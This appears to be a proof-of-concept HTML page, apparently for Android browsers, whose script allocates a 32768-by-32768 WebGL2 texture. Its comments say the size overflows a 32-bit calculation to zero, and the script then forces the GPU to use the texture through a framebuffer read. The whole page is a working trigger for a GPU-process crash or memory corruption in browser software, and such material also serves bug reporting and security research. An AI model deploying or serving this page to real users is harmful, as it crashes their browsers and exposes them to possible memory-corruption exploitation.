<!DOCTYPE html>
<html>
<body>
<canvas id="c" width="1" height="1"></canvas>
<script>
const gl = document.getElementById('c').getContext('webgl2', {
  powerPreference: 'high-performance',
  failIfMajorPerformanceCaveat: false
});
if (!gl) throw new Error('WebGL2 not supported');

const maxTexSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
// Use 32768 if supported; otherwise fall back to a large value that still overflows
const size = Math.min(32768, maxTexSize);
console.log('Using size:', size, 'max:', maxTexSize);

// Create a texture that causes 32-bit overflow: 32768x32768*4 = 0x100000000 -> truncated to 0
const tex = gl.createTexture();
gl.bindTexture(gl.TEXTURE_2D, tex);
gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);

// Force the GPU to actually allocate and use the texture
const fb = gl.createFramebuffer();
gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
const pixel = new Uint8Array(4);
gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixel);

console.log('If you see this, the GPU process may have already crashed. Check logcat.');
</script>
</body>
</html>
